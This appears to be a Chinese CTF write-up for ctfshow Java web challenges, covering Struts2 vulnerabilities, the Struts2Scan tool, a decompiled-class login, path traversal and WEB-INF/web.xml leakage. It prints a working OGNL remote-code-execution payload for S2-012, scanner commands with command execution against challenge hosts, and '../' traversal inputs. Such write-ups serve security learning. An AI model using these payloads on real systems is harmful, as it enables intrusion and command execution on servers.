---
title: ctfshow web入门 (java)
categories: ctfshow
---
# Struts 2 
Struts2是一个基于MVC设计模式的`Web应用框架`，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的体系结构与Struts 1的体系结构差别巨大。Struts 2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与ServletAPI完全脱离开，所以Struts 2可以理解为WebWork的更新产品。虽然从Struts 1到Struts 2有着非常大的变化，但是相对于WebWork，Struts 2的变化很小。

<!--more-->
---
```
s2-001
s2-007
s2-008
s2-009
s2-012
s2-013
s2-015
s2-016
s2-019
s2-029
s2-032
s2-045
s2-046
s2-048
s2-052
```
---

![](https://img-blog.csdnimg.cn/20210404194504551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---

# 通杀脚本工具

网上的 poc都有，工具用起来很方便

struts2:

![](https://img-blog.csdnimg.cn/20210404194520756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)


struts2-scan
```
py Struts2Scan.py -u http://6e12ef79-3cca-48ec-b6d2-ee430f9c5901.challenge.ctf.show:8080/S2-005/example/HelloWorld.action
```
![](https://img-blog.csdnimg.cn/20210404194649664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

```
py Struts2Scan.py -u http://6e12ef79-3cca-48ec-b6d2-ee430f9c5901.challenge.ctf.show:8080/S2-005/example/HelloWorld.action -n s2-005 --exec
```

执行env

> env命令用于显示系统中已存在的环境变量，以及在定义的环境中执行指令。该命令只使用"-"作为参数选项时，隐藏了选项"-i"的功能。若没有设置任何选项和参数时，则直接显示当前的环境变量。 如果使用env命令在新环境中执行指令时，会因为没有定义环境变量"PATH"而提示错误信息"such file or directory"。此时，用户可以重新定义一个新的"PATH"或者使用绝对路径。


![](https://img-blog.csdnimg.cn/20210404194704376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)



# 283
Struts2 showcase远程代码执行漏洞:混个脸熟

![](https://img-blog.csdnimg.cn/20210404194713379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# 284
s2-012

![](https://img-blog.csdnimg.cn/20210404194721875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

poc:
```
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"env"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```



![](https://img-blog.csdnimg.cn/20210404194734506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)



# 295

[s2-048](https://www.jianshu.com/p/356291fb26a2)

![](https://img-blog.csdnimg.cn/20210404194751522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---

# 298

java decompiler反编译class文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210413160349363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)

跟进：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210413160427413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)
访问：
>/ctfshow/login?username=admin&password=ctfshow



# 299-300

/view-source?file=../../../../../fl3g

/view-source?file=../../../../../f1bg



## 关于WEB-INF/web.xml
在了解WEB-INF/web.xml泄露之前，我们先要知道，web.xml是一个什么样的文件，以及它的泄露会出现哪些问题。
咱们先来看看WEB-INF这个文件夹
WEB-INF主要包含以下内容：

- /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
- /WEB-INF/classes/：包含所有的 Servlet 类和其他类文件，类文件所在的目录结构与他们的包名称匹配。
- /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
- /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
- /WEB-INF/database.properties：数据库配置文件。
  

WEB-INF/web.xml泄露的起因就是我们在使用网络架构的时候，对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。
